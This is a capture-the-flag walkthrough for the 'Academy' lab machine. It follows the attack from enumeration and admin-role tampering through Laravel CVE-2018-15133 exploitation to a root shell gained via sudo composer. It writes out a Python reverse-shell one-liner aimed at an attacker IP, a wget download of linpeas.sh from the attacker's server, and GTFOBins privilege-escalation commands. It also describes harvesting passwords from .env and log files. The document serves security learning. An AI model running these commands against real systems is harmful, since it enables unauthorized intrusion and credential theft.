Academy
==========================================
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/Academy.jpeg)  
Short retelling
----
* Use Gobuster to find admin.php page
* Register new user with admin rights using Burpsuite
* Find some hidden page and look for some vulnerabilities
* Use CVE for Laravel and get reverse-shell
* Find a first user password in the web page directory
* Find a second user password in log files
* Check for allowed commands with sudo rights for user
* Find a way to get root using composer with sudo rights  

Enumeration
--------------
Let's start with scanning open ports using Nmap
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/Nmap.PNG "Scan results")
We can see three open ports with SSH, HTTP and Mysqlx services  

We need to add academy.htb in /etc/host and then we can explore the web page
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/Academy%20web.PNG)

After register a new user we can see content of main page
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/Academy%20login.PNG)
There are nothing interesting on it

Using gobuster for directory bruteforce didn't give results but wfuzz with following command showed admin.php page
````
wfuzz -z file,/usr/share/wordlists/wfuzz/general/common.txt -u http://academy.htb/FUZZ.php --hc 404
````
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/wfuzz.PNG)

There is roleid parameter in registry form request. Some experiments with it let us register an administrator user.
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/Burp%20register.PNG)
****
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/Adm%20register%20new.png)

Foothold
----------------------
Now we can login as created user on admin.php
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/Academy%20louch%20panel.PNG)

There is interesting web page dev-staging-01.academy.htb, we can add it to /etc/host and check its content
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/Admin%20panel.PNG)

After some search on the page i noticed "laravel.log" on exception message and then found CVE-2018-15133 that allows to execute code on a vulnerable laravel application 

There are several exploits for this CVE, i'll use this [python sctipt](https://github.com/aljavier/exploit_laravel_cve-2018-15133)
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/pwn_laravel.PNG)

We need API_KEY to exploit the application, luckily we can find it at the dev-staging page
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/app_key.PNG)

Now we can execute some code in interractive mode using the exploit
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/pwn_laravel_int.PNG)

There is python3 on the system and we can get revers-shell using following command:
``````
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
``````
Now we are in the system as www-data  
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/whoami.PNG)

User1
------------
Using the recursive grep command in the web-app directory to find some passwords didn't give any results, but there are some hidden files in directory so we can check it and find some password in .env file  
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/env%20pas.PNG)

There are several users on the system
```
www-data@academy$ ls /home/
ls /home/
21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
```
Login attempt with the cry0l1t3 user using found password was successed and we got the user.txt flag  
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/user%20flag.PNG)

User2
---------
Cry0l1t3 is in the adm group in the system so he can read files in /var/log  
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/adm%20group.PNG)

Let's use [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to find some privilege escalation vector
We need to start http-sever on Kali using following command
````
Python -m SimpleHTTPServer
````
And then we can download the script to the victim system using wget
````
wget http://10.10.14.8:8000/linpeas.sh
````

LinPEAS found mrb3n's password in /var/log/audit log file  
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/mrb3n%20pass.jpg)

So now we can login as mrb3n  
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/mrb3n.PNG)  

Geting root
--------
Using 'sudo -l' command showed us that mrb3n can run '/composer' as super user

![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/sudo%20l.PNG)  

After some googling i found [GTFOBins ./composer page](https://gtfobins.github.io/gtfobins/composer/) and found out that if we can run /composer as super user we can then use following commands to get root privileges:

````
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
````
And now we are root  
![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/root.PNG)
